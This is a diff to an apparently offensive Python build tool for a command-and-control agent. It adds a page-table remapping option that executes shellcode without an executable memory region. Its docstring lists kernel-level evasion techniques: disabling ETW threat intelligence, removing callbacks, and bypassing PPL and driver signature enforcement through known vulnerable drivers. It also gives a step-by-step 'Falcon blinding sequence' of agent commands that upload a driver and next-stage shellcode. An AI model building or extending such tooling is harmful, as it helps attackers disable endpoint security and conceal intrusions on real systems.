@@ -18,11 +18,14 @@ Two build modes:
 Capabilities:
   ETW-TI disable, ObRegisterCallbacks removal, Psp notify-callback removal,
   DKOM, PPL bypass, DSE bypass, HVCI check, RTCore64 / gdrv / WinRing0x64
+  PTE remapping (--pte-exec) — execute shellcode as ntdll code, no RX VAD entry
 
 Recommended Falcon blinding sequence (fileless path):
   1.  agent> upload C:\\Windows\\Temp\\rtc.sys
-  2.  agent> byovdrun /cdn/static/v3/byovd.enc
-      (server had: lilith build --byovd --driver-path C:\\Windows\\Temp\\rtc.sys)
+  2.  agent> upload C:\\Windows\\Temp\\agent.bin  (next-stage SC, optional)
+  3.  agent> byovdrun /cdn/static/v3/byovd.enc
+      (server had: lilith build --byovd --driver-path C:\\Windows\\Temp\\rtc.sys
+                                         --ops "--etwti --remove-callbacks --pte-exec C:\\Windows\\Temp\\agent.bin")
 """
 
 import os
@@ -155,7 +158,8 @@ if __name__ == "__main__":
                    help="Driver path baked into shellcode (target path)")
     p.add_argument("--ops",
                    default="--etwti --remove-callbacks --remove-ob-callbacks",
-                   help="BYOVD operations to bake into shellcode")
+                   help="BYOVD operations to bake into shellcode "
+                        "(append --pte-exec <path> for no-RX shellcode injection)")
     p.add_argument("--enc-out",            default="byovd.enc",
                    help="Output .enc path for shellcode variant")
     args = p.parse_args()
